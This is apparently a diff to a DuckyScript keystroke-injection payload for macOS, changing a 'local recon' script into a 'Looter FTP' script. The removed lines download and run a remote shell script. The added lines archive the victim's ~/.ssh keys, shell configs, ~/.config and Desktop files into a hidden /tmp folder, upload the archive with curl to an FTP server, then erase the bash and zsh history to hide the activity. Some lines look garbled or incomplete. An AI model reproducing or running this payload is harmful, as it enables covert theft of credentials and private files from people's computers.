@@ -1,11 +1,11 @@
-REM Title: MacOS local recon script
+REM Title: MacOS Looter FTP
 REM Author: un1x01d
-REM Description: Collects important recon information from the victim. Includes: OS, Hardware, Network, Filesystem, Wifi etc..
+REM Description: The script will compress the Desktop and Documents folders in a hidden location, afterwhich the file will be uploaded to an FTP server and deleted.
+REM              Remember that FTP is NOT a secure protocol and should only be used with temporary or personal servers.
 REM Target: MacOS 10.0+
 REM Version: 1.0
-REM Notes: The results will be uploaded to a FTP server. I used https://www.drivehq.com/ with a temp email from https://temp-mail.org/ for the verification email
-REM Notes: Part of the script is to generate a list of all the files in the home directory, dependeing on the amount of files the size of the list will vary. Which might take longer to upload. 
-REM Usage: Replace the <ftp server> <username> <password> fields with the right values.
+REM Tested on 2019 and 2020 Macbook Pro's, adjust the DELAY times for older/slower macs.
+REM Usage: Replace HOSTNAME, USER and PASSWORD. 
 
 GUI SPACE
 DELAY 100
@@ -13,8 +13,20 @@ STRING Terminal
 ENTER
 DELAY 100
 
-STRING mkdir -p /tmp/.p/.w/.n/.d ; curl -s "https://raw.githubusercontent.com/un1x01d/o.mg-payloads/main/MacOS_Sysinfo/mac_local_recon.sh" -o /tmp/.p/.w/.n/.d/.mlr && chmod +x /tmp/.p/.w/.n/.d/.mlr ; /tmp/.p/.w/.n/.d/.mlr <ftp server> <username> <password> & disown
+STRING mkdir -p /tmp/.s/.t/.e/.a/.l && cd /tmp/.s/.t/.e/.a/.l && find . ~/Downloads >> Downloads.list && find ~/ >> home_dir_file_list.txt && tar cfz .loot.tgz ~/Desktop/10g ~/.ssh ~/.bash* ~/.config ~/.zsh* &
 ENTER
-DELAY 200 
-GUI q
+
+DELAY 100
+STRING wait %1 && clear 
 ENTER
+DELAY 50
+STRING curl -sT /tmp/.s/.t/.e/.a/.l/.loot.tgz <HOSTNAME> --user <USER>:<PASSWORD> >> /dev/null &
+ENTER
+DELAY 50
+STRING clean
+
+STRING wait %1 && clear
+STRING set -e ; clear ; rm -rf /tmp/.s ~/.bash_history ~/.zsh_history & clear &&  history -c && exit
+ENTER
+DELAY 50
+GUI m
